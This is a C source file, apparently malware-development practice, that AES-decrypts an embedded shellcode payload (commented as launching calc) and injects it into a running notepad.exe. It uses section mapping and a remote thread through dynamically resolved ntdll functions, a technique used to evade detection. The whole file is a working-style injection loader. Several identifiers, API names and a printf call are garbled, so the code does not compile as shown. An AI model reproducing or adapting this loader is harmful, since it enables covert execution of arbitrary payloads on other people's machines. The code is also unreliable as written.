# include <winternl.h>
# include <windows.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <tlhelp32.h>
# include <wincrypt.h>
#pragma comment (lib, "crypt.lib")
#pragma comment (lib, "advapi32")

//brings up calc  
char key[] = { 0x2e, 0x54, 0x6c, 0xb9, 0x4e, 0x1, 0xcb, 0x49, 0xf7, 0x6a, 0x18, 0xf5, 0x34, 0xc7, 0x3f, 0xeb };
char unsigned payload[] = { 0x53, 0x1f, 0x82, 0x62, 0xa6, 0xb0, 0x2c, 0x41, 0x3e, 0xc0, 0x45, 0xcd, 0x40, 0xb1, 0xf8, 0xdc, 0xd8, 0x3d, 0x25, 0x4, 0x3c, 0x94, 0xcf, 0x0, 0xcd, 0xfb, 0xb7, 0xc3, 0xb2, 0xc4, 0x1e, 0x60, 0x6c, 0x57, 0x58, 0x11, 0x37, 0xaa, 0x54, 0x8f, 0x36, 0x3b, 0x70, 0xb1, 0xd, 0x75, 0x97, 0x6, 0x38, 0x50, 0x93, 0xb7, 0xd2, 0x45, 0x1b, 0xbe, 0xb7, 0xea, 0x3, 0x9b, 0x9a, 0x1e, 0xff, 0x7f, 0x72, 0xe4, 0xe3, 0xd0, 0x98, 0x27, 0x2b, 0x47, 0x21, 0x4b, 0x66, 0xe3, 0xed, 0x8c, 0xdf, 0x7b, 0xa, 0x46, 0x62, 0x1a, 0xc, 0x85, 0x95, 0xf8, 0xe0, 0xd2, 0xe4, 0x59, 0x47, 0xe8, 0xaa, 0x25, 0x1f, 0x99, 0x94, 0xb0, 0x6, 0x3b, 0x15, 0xb1, 0xa9, 0xfb, 0x57, 0xc9, 0x21, 0xbd, 0xf7, 0x25, 0xff, 0xdc, 0x87, 0xba, 0x64, 0xbe, 0x3f, 0x61, 0x28, 0x89, 0x13, 0x4d, 0xb6, 0xbc, 0xfc, 0xf5, 0x71, 0x55, 0x3d, 0x3d, 0x16, 0x87, 0x40, 0x40, 0x9b, 0x15, 0x78, 0x78, 0x7d, 0xe7, 0xc4, 0xf4, 0x61, 0xe0, 0xbb, 0x70, 0x3b, 0xf4, 0x0, 0x94, 0x95, 0xce, 0x44, 0x27, 0x1f, 0x98, 0xca, 0x54, 0x59, 0x97, 0xa8, 0x4c, 0x8, 0x9f, 0x4b, 0xc0, 0x91, 0x45, 0x51, 0x84, 0x51, 0x4f, 0x5c, 0x79, 0x7d, 0x26, 0xcb, 0x98, 0x75, 0x5, 0x33, 0xb6, 0x43, 0xf3, 0x43, 0xea, 0xf4, 0x9c, 0xec, 0x5c, 0xab, 0x42, 0x39, 0x1e, 0x2f, 0xf6, 0x9a, 0xcc, 0x54, 0x7f, 0x67, 0x88, 0x8b, 0xa3, 0x8f, 0xf9, 0xe7, 0xd7, 0xf1, 0x60, 0x72, 0x78, 0xc0, 0xf0, 0xf9, 0x31, 0x8c, 0x7f, 0xf9, 0xa0, 0x21, 0xdf, 0x27, 0x88, 0x9f, 0x5c, 0x66, 0xed, 0x7d, 0x35, 0x99, 0xa9, 0x80, 0xb6, 0xe7, 0x6e, 0x91, 0x37, 0xd1, 0xd5, 0x23, 0x61, 0x6, 0xb1, 0x33, 0x5a, 0x3b, 0xa6, 0xd6, 0xac, 0x93, 0xfb, 0x7a, 0x40, 0x97, 0x25, 0xaf, 0xbb, 0x84, 0x9b, 0xcb, 0x2e, 0xc5, 0x33, 0xf5, 0xad, 0x2d, 0x16, 0x51, 0x1d, 0x44, 0xa1, 0x2e, 0x6b, 0x2b, 0x23, 0x21, 0xb0, 0xa4, 0xb7, 0xee, 0x2, 0x6, 0x99, 0xd8, 0x3c };

unsigned int payload_len = sizeof(payload);

//typedef
typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int FindTarget(const char *procname) {
    
    HANDLE hProcSnap;
    PROCESSENTRY pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)){
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcessSnap, &pe32)){
        if(LstrcmpiA(procname, pe32.szExeFile) == 0){
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

HANDLE FindThread(int pid){

    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while(Thread32Next(Snap, &thEntry)){
        if (thEntry.th32OwnerProcessID == pid){
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }
    }
    CloseHandle(Snap);

    return hThread;
}

// set remote process/
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len){

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// creat memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress (GetModuleHandle("NTDLL.DLL"), "NTCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );

	// create locla section view
	NTMapViewOfSection_t pNTMapViewOfScetion = (NtMapViewOfsection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NTMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;

	pNTMapViewofSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section
	memcpy(pLocalView, payload, payload_len);

	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	// execute 
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");

	if (pRtlCreateUserThread == NULL)
		return -2;
	
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

int main(void) {

	int pid =0;
	HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf(/"Notepad.exe PID =%d\n", pid);

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		if (hProc != NULL) {
			// Decrypt and Inject payload
			AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
			InjectView(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}